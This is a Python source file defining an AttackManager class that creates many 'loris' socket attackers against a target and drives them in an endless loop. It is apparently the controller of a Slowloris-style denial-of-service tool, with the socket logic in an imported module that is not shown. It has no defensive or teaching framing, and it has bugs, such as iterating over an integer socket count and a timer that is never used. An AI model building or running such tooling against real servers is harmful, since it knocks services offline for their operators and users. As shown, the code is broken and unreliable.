import time

from Attacker import Attacker


class AttackManager:
    def __init__(self, target, numSockets):
        self.target = target
        self.socketCount = numSockets

        self.attackIsActive = False

        self.socketList = []

        self.timer = 0

    # Show the current status of the attack
    def checkAttackStatus(self):
        if (self.attackIsActive == True):
            statuses = []

            for loris in self.socketList:
                statuses.append(loris.returnStatus())
            return statuses

        elif (self.attackIsActive == False):
            return "Current Status: There is no attack occuring"
        else:
            return "Error: Something is broken"

    # Procede with an attack
    def attack(self):
        while (True):

            for loris in self.socketList:
                loris.attack()
            timer = time.time()

    def createAttackers(self):
        for i in self.socketCount:
            socket = Attacker(self.target)
            self.socketList.append(socket)
